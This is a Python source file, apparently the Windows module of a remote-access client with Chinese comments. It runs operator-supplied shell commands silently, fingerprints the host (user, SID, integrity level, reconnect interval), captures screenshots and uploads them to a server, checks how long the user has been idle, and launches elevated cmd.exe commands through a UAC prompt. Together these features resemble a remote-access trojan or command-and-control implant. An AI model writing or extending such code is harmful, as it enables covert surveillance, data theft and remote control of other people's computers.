import os
import platform
import subprocess
import sys
import tempfile

from client.commands.command_context import CommandCancelledError, CommandTimeoutError
from client.config.runtime_config import RECONNECT_INTERVAL_SECONDS
from core.platform.platform_identity import detect_platform_alias
from core.utils.client_util import get_executable_path
from core.utils.command_output import StructuredCommandResult
from core.utils.formatting import get_time
from core.utils.logger import logger

if detect_platform_alias() == 'win':
    from client.commands.platform.utils.win_util import get_integrity_level, get_sam_compatible_name, get_locale_tag, \
    get_windows_uid_gid_sid


class WinPlatformService:

    def __init__(self, owner):
        self.owner = owner

    def run(self, command):
        command_text = (command or '').strip()
        if not command_text:
            return 0, 'Usage: run <program ...>'

        try:
            # Windows: 创建新控制台窗口
            process = subprocess.Popen(
                command_text,
                shell=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NEW_CONSOLE
            )

            return 1, f'Process created: {process.pid}'

        except CommandCancelledError:
            return 0, 'Command cancelled'
        except CommandTimeoutError:
            return 0, 'Command timed out and was terminated'
        except Exception as e:
            return 0, f'Failed to start process: {e}'

    def collect_system_info(self):



        try:
            import psutil


            info = {}
            info['pid'] = os.getpid()
            info['hostname'] = platform.node()
            info['os'] = platform.platform()
            info['os_version'] = platform.version()
            info['architecture'] = platform.machine()
            info['processor'] = platform.processor()
            info['cpu_count'] = os.cpu_count()

            # 内存信息
            mem = psutil.virtual_memory()
            info['mem_total'] = f'{mem.total / (1024 ** 3):.2f} GB'
            info['mem_avail'] = f'{mem.available / (1024 ** 3):.2f} GB'

            # 进程信息
            proc = psutil.Process()

            info['username'] = proc.username()
            # info['username_sam'] = get_sam_compatible_name()

            info['locale'] = get_locale_tag()

            sid_info = get_windows_uid_gid_sid()
            info['uid']=sid_info.get('uid', '')
            info['gid']=sid_info.get('gid', '')

            try:
                info['integrity'] = get_integrity_level()
            except Exception:
                info['integrity'] = ''

            info['exec_path'] = get_executable_path()
            info['reconnect_interval'] = RECONNECT_INTERVAL_SECONDS
            info['cwd'] = os.getcwd()

            # Python 信息
            info['python_version'] = sys.version

            return StructuredCommandResult(
                status=1,
                data=info,
                shape='dict',
                width=20,
            )

        except Exception as e:
            logger.error(e, exc_info=True)
            return 0, f'Failed to get system info: {e}'

    def capture_screenshot(self):
        try:
            import pyautogui

            self.owner._send_interim_result(1, 'Capturing screenshot...', 0)

            # 创建临时文件
            temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
            temp_file.close()

            # 截图
            screenshot = pyautogui.screenshot()
            screenshot.save(temp_file.name)

            file_size = os.path.getsize(temp_file.name)
            self.owner._send_interim_result(1, f'Screenshot captured ({file_size} bytes)', 0)

            # 上传文件
            filename = f'screenshot_{get_time()}.png'
            self.owner.http_file_transfer_service.upload_single_file_to_server_result(temp_file.name, category='screenshot')

            self.owner._send_final_result(1, f'Screenshot uploaded: {filename}')

        except Exception as e:
            self.owner._send_final_result(0, f'Screenshot failed: {e}')
        finally:
            if temp_file and os.path.exists(temp_file.name):
                try:
                    os.unlink(temp_file.name)
                except:
                    pass

    def get_user_idletime(self):
        try:
            import win32api

            idle_ms = win32api.GetTickCount() - win32api.GetLastInputInfo()
            idle_seconds = idle_ms / 1000.0

            return 1, f'User idle time: {idle_seconds:.2f} seconds'

        except Exception as e:
            return 0, f'Failed to get idle time: {e}'

    def run_as_admin(self, command):
        import ctypes
        try:
            result = ctypes.windll.shell32.ShellExecuteW(
                None, 'runas', 'cmd.exe', f'/c {command}', None, 1
            )
            if result > 32:
                return 1, f'Executed: {command}'
            return 0, f'Failed with code: {result}'
        except Exception as e:
            return 0, f'Failed: {e}'
